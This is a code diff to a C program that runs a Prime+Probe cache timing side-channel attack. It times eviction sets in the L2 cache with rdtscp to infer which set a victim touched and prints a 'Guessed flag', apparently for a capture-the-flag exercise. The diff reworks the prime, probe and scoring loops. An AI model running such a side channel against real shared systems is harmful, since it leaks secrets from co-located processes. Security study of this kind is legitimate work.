@@ -11,9 +11,7 @@
 #define LINE_SIZE 64
 #define STRIDE (NUM_L2_CACHE_SETS * LINE_SIZE)
 
-#define REPEATS 1500
-
-static int persistent_scores[NUM_L2_CACHE_SETS] = {0};
+#define REPEATS 2000
 
 volatile uint8_t *buf;
 volatile uint8_t *eviction_sets[NUM_L2_CACHE_SETS][WAYS];
@@ -93,53 +91,49 @@ int main() {
 
             shuffle(perm);
 
-            /* PRIME */
             for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
+
                 int set = perm[i];
-                for(int w = 0; w < WAYS - 2; w++)
+
+                /* PRIME this set */
+                for(int w = 0; w < WAYS; w++) {
                     tmp ^= *eviction_sets[set][w];
+                }
+
+                wait_cycles(5000);
+
+                /* PROBE this set */
+
+                uint64_t latency = 0;
+
+                for(int r = 0; r < 2; r++) {
+                    uint64_t start = rdtscp();
+
+                    for(int w = WAYS - 1; w >= 0; w--) {
+                        tmp ^= *eviction_sets[set][w];
+                    }
+
+                    uint64_t end = rdtscp();
+                    latency += (end - start);
+                }
+
+                scores[set] += latency;
             }
+        }
+        int best_set = 0;
+        uint64_t best_latency = 0;
 
-            /* let victim run */
-            wait_cycles(10000);
+        for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
 
-            /* PROBE */
-            for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
+            uint64_t avg = scores[set] / REPEATS;
 
-            int set = perm[i];
-            uint64_t latency = 0;
-
-            for(int probe = 0; probe < 2; probe++) {
-
-                uint64_t start = rdtscp();
-
-                for(int w = WAYS - 3; w >= 0; w--)
-                    tmp ^= *eviction_sets[set][w];
-
-                uint64_t end = rdtscp();
-                latency += end - start;
-            }
-
-            if(latency > 200)
-                scores[set]++;
+            if(avg > best_latency) {
+                best_latency = avg;
+                best_set = set;
             }
         }
 
-        for(int s = 0; s < NUM_L2_CACHE_SETS; s++){
-                    persistent_scores[s] += scores[s];
-        }
-
-        int best_set = -1;
-        uint64_t best_score = 0;
-
-        for(int s = 0; s < NUM_L2_CACHE_SETS; s++){
-            if(persistent_scores[s] > best_score){
-            best_score = persistent_scores[s];
-            best_set = s;
-            }
-        }
-
-        printf("Guessed flag: %d (latency=%lu)\n", best_set, best_score);
+        printf("Guessed flag: %d (latency=%lu)\n", best_set, best_latency);
 
         wait_cycles(2000);
     }
